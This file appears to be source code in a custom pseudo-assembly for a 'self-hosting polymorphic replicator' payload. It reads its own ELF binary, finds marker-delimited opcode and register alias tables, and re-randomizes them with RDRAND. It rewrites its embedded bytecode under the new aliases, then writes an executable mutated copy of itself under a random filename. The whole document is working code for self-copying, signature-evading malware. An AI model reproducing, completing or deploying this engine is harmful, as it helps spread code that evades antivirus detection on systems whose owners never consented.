# ============================================================
# Phase 5.5 Payload — Full Self-Hosting Polymorphic Replicator
# ============================================================

# ---- Section 1 — Construct and Open argv[0] ----
MOV_REG_REG    rdi, rsp
ADD_REG_IMM8   rdi, 16
MOV_REG_MEM    rdi, [rdi]   # rdi = argv[0] string pointer

# sys_open(argv[0], O_RDONLY=0)
MOV_REG_IMM8   rax, 2       # sys_open
XOR_REG_REG    rsi, rsi     # O_RDONLY = 0
SYSCALL
MOV_REG_REG    r9, rax      # r9 = fd (temporary)

# ---- Section 2 — Set up ELF buffer pointer ----
MOV_REG_REG    rax, r14
ADD_REG_IMM32  rax, 0x3000
MOV_REG_REG    rbx, rax     # rbx = ELF buffer base, PERMANENT

# ---- Section 3 — Read ELF, save elf_size, close fd ----
MOV_REG_IMM8   rax, 0       # sys_read
MOV_REG_REG    rdi, r9      # fd
MOV_REG_REG    rsi, rbx     # buffer = ELF base
MOV_REG_IMM64  rdx, 0x8000  # max 32768 bytes
SYSCALL
MOV_REG_REG    r11, rax     # r11 = elf_size (save IMMEDIATELY)

# Store elf_size at scratch+0x00 (r14+0xD200)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD200
MOV_MEM_REG    [rdi], r11

# Close fd
MOV_REG_IMM8   rax, 3
MOV_REG_REG    rdi, r9
SYSCALL

# ---- Section 4 — Find alias map magic (0x1122334455667788) ----
MOV_REG_REG    rsi, rbx
MOV_REG_IMM64  rax, 0x8877665544332210
INC_REG        rax

SCAN_ALIAS_MAP:
    MOV_REG_MEM    r9, [rsi]
    CMP_REG_REG    r9, rax
    JE_REL8        FOUND_ALIAS_MAP
    INC_REG        rsi
    JMP_REL8       SCAN_ALIAS_MAP

FOUND_ALIAS_MAP:
    ADD_REG_IMM8   rsi, 8       # skip magic bytes
    MOV_REG_REG    r10, rsi     # r10 = alias_map pointer in ELF (hold through section 8)

# ---- Section 4b — Find reg alias map magic (0xAABBCCDDEEFF9988) ----
MOV_REG_REG    rsi, rbx
MOV_REG_IMM64  rax, 0xAABBCCDDEEFF9987
INC_REG        rax

SCAN_REG_ALIAS_MAP:
    MOV_REG_MEM    r9, [rsi]
    CMP_REG_REG    r9, rax
    JE_REL8        FOUND_REG_ALIAS_MAP
    INC_REG        rsi
    JMP_REL8       SCAN_REG_ALIAS_MAP

FOUND_REG_ALIAS_MAP:
    ADD_REG_IMM8   rsi, 8       # skip magic bytes
    # Save reg_alias_map pointer to scratch+0x18 (r14+0xD218)
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD218
    MOV_MEM_REG    [rdi], rsi

# ---- Section 5 — Generate 114 new unique alias bytes into r14+0xD000 ----
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD000     # rdi = write pointer (advances as bytes are stored)
MOV_REG_IMM    rcx, 114        # need 114 unique nonzero bytes

GEN_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        GEN_ALIAS_DONE

  REGEN:
      RDRAND_REG     rax
      JNC_REL8       REGEN

      AND_REG_IMM8   rax, 0x7F

      CMP_REG_IMM8   rax, 0
      JE_REL8        REGEN

      # Uniqueness check: scan [r14+0xD000 .. rdi)
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD000
    MOV_REG_IMM    rdx, 114
    SUB_REG_REG    rdx, rcx    # rdx = already stored count

CHECK_UNIQUE:
    CMP_REG_IMM8   rdx, 0
    JE_REL8        UNIQUE_OK
    MOV_REG_BYTE_MEM  r9, [rsi]
    CMP_REG_REG    rax, r9
    JE_REL8        REGEN
    INC_REG        rsi
    DEC_REG        rdx
    JMP_REL8       CHECK_UNIQUE

UNIQUE_OK:
    MOV_BYTE_MEM_REG  [rsi], rax    # rsi is now the next free slot
    DEC_REG        rcx
    JMP_REL8       GEN_ALIAS_LOOP

GEN_ALIAS_DONE:

# ---- Section 5b — Generate 16 shuffled reg_alias bytes into r14+0xD300 ----
# Copy 0..15 straight first
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD300
MOV_REG_IMM8   rcx, 0
INIT_REG_MAP_LOOP:
    CMP_REG_IMM8   rcx, 16
    JE_REL8        INIT_REG_MAP_DONE
    MOV_BYTE_MEM_REG [rdi], rcx
    INC_REG        rdi
    INC_REG        rcx
    JMP_REL8       INIT_REG_MAP_LOOP

INIT_REG_MAP_DONE:
# Shuffle 0..7
MOV_REG_IMM8   rcx, 7
SHUFFLE_LOW_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_LOW_DONE
    
    CMP_REG_IMM8   rcx, 4
    JE_REL8        SHUF_LOW_SKIP
    CMP_REG_IMM8   rcx, 5
    JE_REL8        SHUF_LOW_SKIP

  SHUF_LOW_REGEN:
    RDRAND_REG     rax
    JNC_REL8       SHUF_LOW_REGEN
    AND_REG_IMM8   rax, 7
    CMP_REG_REG    rax, rcx
    JGE_REL8       SHUF_LOW_REGEN

    CMP_REG_IMM8   rax, 4
    JE_REL8        SHUF_LOW_REGEN
    CMP_REG_IMM8   rax, 5
    JE_REL8        SHUF_LOW_REGEN

    # Swap [r14+0xD300+rcx] with [r14+0xD300+rax]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD300
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM r8, [rsi]    # r8 = map[i]

    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD300
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM r9, [rdi]    # r9 = map[rnd]

    MOV_BYTE_MEM_REG [rsi], r9
    MOV_BYTE_MEM_REG [rdi], r8

SHUF_LOW_SKIP:
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_LOW_LOOP

SHUFFLE_LOW_DONE:
# Shuffle 8..15
MOV_REG_IMM8   rcx, 15
SHUFFLE_HIGH_LOOP:
    CMP_REG_IMM8   rcx, 8
    JE_REL8        SHUFFLE_HIGH_DONE

    CMP_REG_IMM8   rcx, 14
    JE_REL8        SHUF_HIGH_SKIP
    CMP_REG_IMM8   rcx, 13
    JE_REL8        SHUF_HIGH_SKIP
    CMP_REG_IMM8   rcx, 12
    JE_REL8        SHUF_HIGH_SKIP

  SHUF_HIGH_REGEN:
    RDRAND_REG     rax
    JNC_REL8       SHUF_HIGH_REGEN
    AND_REG_IMM8   rax, 15
    CMP_REG_IMM8   rax, 8
    JL_REL8        SHUF_HIGH_REGEN
    CMP_REG_REG    rax, rcx
    JGE_REL8       SHUF_HIGH_REGEN

    CMP_REG_IMM8   rax, 14
    JE_REL8        SHUF_HIGH_REGEN
    CMP_REG_IMM8   rax, 13
    JE_REL8        SHUF_HIGH_REGEN
    CMP_REG_IMM8   rax, 12
    JE_REL8        SHUF_HIGH_REGEN

    # Swap
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD300
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM r8, [rsi]    # r8 = map[i]

    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD300
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM r9, [rdi]    # r9 = map[rnd]

    MOV_BYTE_MEM_REG [rsi], r9
    MOV_BYTE_MEM_REG [rdi], r8

SHUF_HIGH_SKIP:
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_HIGH_LOOP

SHUFFLE_HIGH_DONE:


# ---- Section 6 — Find payload boundaries ----
# Find start magic 0x37133713EFBEADDE
MOV_REG_REG    rsi, rbx
MOV_REG_IMM64  rax, 0x37133713EFBEADDD
INC_REG        rax

SCAN_PAYLOAD_START:
    MOV_REG_MEM    r9, [rsi]
    CMP_REG_REG    r9, rax
    JE_REL8        FOUND_PAYLOAD_START
    INC_REG        rsi
    JMP_REL8       SCAN_PAYLOAD_START

FOUND_PAYLOAD_START:
    ADD_REG_IMM8   rsi, 8
    MOV_REG_REG    r11, rsi     # r11 = payload_start in ELF

    # Save payload_start to scratch+0x08 (r14+0xD208) before r11 is reused
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD208
    MOV_MEM_REG    [rdi], r11

# Find end magic 0x31733173EDDAEBFE
MOV_REG_IMM64  rax, 0x31733173EDDAEBFD
INC_REG        rax

SCAN_PAYLOAD_END:
    MOV_REG_MEM    r9, [rsi]
    CMP_REG_REG    r9, rax
    JE_REL8        FOUND_PAYLOAD_END
    INC_REG        rsi
    JMP_REL8       SCAN_PAYLOAD_END

FOUND_PAYLOAD_END:
    # rsi now points at the end magic; payload length = rsi - r11
    MOV_REG_REG    rcx, rsi
    SUB_REG_REG    rcx, r11    # rcx = payload byte count, used throughout mutate loop

    # Save old payload byte count to scratch+0x10 (r14+0xD210) for padding
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD210
    MOV_MEM_REG    [rdi], rcx

# ---- Section 7 — MUTATE_LOOP with dynamic oplen table ----
# Construct OPLEN TABLE in scratch space (r14+0xD400)
MOV_REG_IMM64  rax, 0x0404010505000905
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD400
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101020202020804
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD408
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101010101010202
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD410
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0202020201010201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD418
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0000050005020202
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD420
MOV_MEM_REG    [rdi], rax

# Construct REG_COUNT TABLE in scratch space (r14+0xD430)
MOV_REG_IMM64  rax, 0x0000000100000101
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD430
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0101010202020000
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD438
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0100000000000201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD440
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0201010101010201
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD448
MOV_MEM_REG    [rdi], rax

MOV_REG_IMM64  rax, 0x0000010001020202
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD450
MOV_MEM_REG    [rdi], rax

MUTATE_LOOP_START:
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xB000  # rdi = mutated payload output pointer
    MOV_REG_REG    rsi, r11     # rsi = payload read ptr (r11 = payload_start)

MUTATE_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        TRAMPOLINE_MUTATE_DONE

    MOV_REG_BYTE_MEM  rax, [rsi]  # read alias byte
    INC_REG        rsi
    DEC_REG        rcx
    PUSH_REG       rcx            # save remaining count

    # Find family: scan r10 (alias_map ptr in ELF) for rax
    MOV_REG_REG    r9, r10
    MOV_REG_IMM8   rdx, 0         # rdx = scan index
    JMP_REL8       FIND_FAMILY

TRAMP_MUTATE_LOOP1:
    JMP_REL8       MUTATE_LOOP

FIND_FAMILY:
    MOV_REG_BYTE_MEM  r11, [r9]
    CMP_REG_REG    rax, r11
    JE_REL8        FOUND_FAMILY
    INC_REG        r9
    INC_REG        rdx
    CMP_REG_IMM8   rdx, 114       # 114 < 128, fits imm8
    JL_REL8        FIND_FAMILY
    POP_REG        rcx
    JMP_REL8       TRAMP_MUTATE_DONE_1    # unknown alias: abort gracefully

FOUND_FAMILY:
    # family = rdx / 3
    MOV_REG_REG    rax, rdx
    XOR_REG_REG    rdx, rdx
    MOV_REG_IMM8   rcx, 3
    DIV_REG        rcx             # rax = family (0–37), rdx = remainder (discarded)

    # Look up oplen from scratch table
    MOV_REG_REG    rcx, r14
    ADD_REG_IMM32  rcx, 0xD400
    ADD_REG_REG    rcx, rax
    MOV_REG_BYTE_MEM  r11, [rcx]   # r11 = operand byte count for this family
    
    PUSH_REG       rax
    JMP_REL8       PICK_SLOT

TRAMP_MUTATE_LOOP_MID:
    JMP_REL8       TRAMP_MUTATE_LOOP1

TRAMPOLINE_MUTATE_DONE:
    JMP_REL8       TRAMP_MUTATE_DONE_1

    # Pick random slot (0, 1, or 2) within family
PICK_SLOT:
    RDRAND_REG     rcx
    JNC_REL8       PICK_SLOT
    AND_REG_IMM8   rcx, 3
    CMP_REG_IMM8   rcx, 3
    JE_REL8        PICK_SLOT

    # new_alias = new_alias_buf[family*3 + slot]
    IMUL_REG_IMM8  rax, 3
    ADD_REG_REG    rax, rcx
    MOV_REG_REG    rcx, r14
    ADD_REG_IMM32  rcx, 0xD000
    ADD_REG_REG    rcx, rax
    MOV_REG_BYTE_MEM  rax, [rcx]

    MOV_BYTE_MEM_REG  [rdi], rax  # write new alias to output
    INC_REG        rdi

    POP_REG        r8             # restore family
    POP_REG        rcx            # restore remaining byte counter
    
    MOV_REG_REG    r9, r11        # r9 = oplen
    SUB_REG_REG    rcx, r9        # account for operand bytes consumed

    # Load reg_count for this family
    MOV_REG_REG    rax, r14
    ADD_REG_IMM32  rax, 0xD430
    ADD_REG_REG    rax, r8
    MOV_REG_BYTE_MEM  r8, [rax]   # r8 = reg_count (0, 1, or 2)

    JMP_REL8       TRANSLATE_REGS_LOOP

TRAMP_MUTATE_DONE_1:
    JMP_REL8       TRAMP_MUTATE_DONE_2

TRAMP_MUTATE_LOOP2:
    JMP_REL8       TRAMP_MUTATE_LOOP_MID

TRANSLATE_REGS_LOOP:
    CMP_REG_IMM8   r8, 0
    JE_REL8        COPY_OPERANDS_LOOP
    # Read old virtual reg ID
    MOV_REG_BYTE_MEM  rax, [rsi]
    
    PUSH_REG       rdi
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD218
    MOV_REG_MEM    rdi, [rdi]
    ADD_REG_REG    rdi, rax
    MOV_REG_BYTE_MEM  rbx, [rdi]  # rbx = NATIVE reg ID
    
    PUSH_REG       r10
    MOV_REG_REG    r10, r14
    ADD_REG_IMM32  r10, 0xD300
    MOV_REG_IMM8   r11, 0
FIND_NEW_VIRT_LOOP:
    MOV_REG_BYTE_MEM  rdi, [r10]
    CMP_REG_REG    rdi, rbx
    JE_REL8        FOUND_NEW_VIRT
    INC_REG        r10
    INC_REG        r11
    JMP_REL8       FIND_NEW_VIRT_LOOP
    
FOUND_NEW_VIRT:
    POP_REG        r10
    POP_REG        rdi
    MOV_BYTE_MEM_REG  [rdi], r11
    
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        r8
    DEC_REG        r9
    JMP_REL8       TRANSLATE_REGS_LOOP

TRAMP_MUTATE_DONE_2:
    JMP_REL8       MUTATE_DONE

COPY_OPERANDS_LOOP:
    CMP_REG_IMM8   r9, 0
    JE_REL8        TRAMP_MUTATE_LOOP2
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        r9
    JMP_REL8       COPY_OPERANDS_LOOP

MUTATE_DONE:
    # Compute mutated payload length
    MOV_REG_REG    r11, rdi
    MOV_REG_REG    rax, r14
    ADD_REG_IMM32  rax, 0xB000
    SUB_REG_REG    r11, rax        # r11 = mutated_payload_length

# ---- Section 8 — Patch ELF buffer in memory ----

# Patch reg_alias_map (16 bytes):
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xD300         # src: new reg alias bytes
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD218
MOV_REG_MEM    rdi, [rdi]          # dst: reg_alias_map in ELF
MOV_REG_IMM    rcx, 16

PATCH_REG_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_REG_ALIAS_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_REG_ALIAS_LOOP

PATCH_REG_ALIAS_DONE:

# Patch alias map (114 bytes):
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xD000         # src: new alias bytes
MOV_REG_REG    rdi, r10            # dst: alias_map in ELF (r10 from section 4)
MOV_REG_IMM    rcx, 114

PATCH_ALIAS_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_ALIAS_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_ALIAS_LOOP

PATCH_ALIAS_DONE:

# Patch payload (mutated bytes):
# Load payload_start from scratch+0x08
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD208
MOV_REG_MEM    rdi, [rdi]          # rdi = payload_start in ELF (dst)

MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xB000         # src: mutated payload
MOV_REG_REG    rcx, r11            # rcx = mutated_payload_length

PATCH_PAYLOAD_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        PATCH_PAYLOAD_DONE
    MOV_REG_BYTE_MEM  rax, [rsi]
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       PATCH_PAYLOAD_LOOP

PATCH_PAYLOAD_DONE:

# ---- Section 9 — Generate filename, write child ELF, chmod, exit ----
# Build 8-char random filename at r14+0xD100
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM8   rcx, 8

GEN_FILENAME_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        GEN_FILENAME_DONE

REGEN_CHAR:
    RDRAND_REG     rax
    JNC_REL8       REGEN_CHAR
    AND_REG_IMM8   rax, 0x3F
    CMP_REG_IMM8   rax, 52
    JGE_REL8       REGEN_CHAR
    CMP_REG_IMM8   rax, 26
    JL_REL8        IS_UPPER
    ADD_REG_IMM8   rax, 71          # lowercase: val + 71 = 'a' + (val-26)
    JMP_REL8       STORE_CHAR

IS_UPPER:
    ADD_REG_IMM8   rax, 65          # uppercase: val + 65 = 'A' + val

STORE_CHAR:
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       GEN_FILENAME_LOOP

GEN_FILENAME_DONE:
    MOV_REG_IMM8   rax, 0
    MOV_BYTE_MEM_REG  [rdi], rax   # null terminator

# sys_open(filename, O_WRONLY|O_CREAT|O_TRUNC=577, 0755=0x1ED)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM8   rax, 2
MOV_REG_IMM    rsi, 577            # O_WRONLY(1)|O_CREAT(0x40)|O_TRUNC(0x200)
MOV_REG_IMM    rdx, 0x1ED          # 0755 octal
SYSCALL
MOV_REG_REG    r9, rax             # r9 = output fd

# sys_write(fd, elf_buf, elf_size)
MOV_REG_IMM8   rax, 1
MOV_REG_REG    rdi, r9
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0x3000
MOV_REG_REG    rdx, r14
ADD_REG_IMM32  rdx, 0xD200
MOV_REG_MEM    rdx, [rdx]          # rdx = elf_size from scratch
SYSCALL

# sys_close(fd)
MOV_REG_IMM8   rax, 3
MOV_REG_REG    rdi, r9
SYSCALL

# sys_chmod(filename, 0755)
MOV_REG_IMM8   rax, 90
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM    rsi, 0x1ED
SYSCALL

# sys_exit(0)
MOV_REG_IMM8   rax, 60
XOR_REG_REG    rdi, rdi
SYSCALL

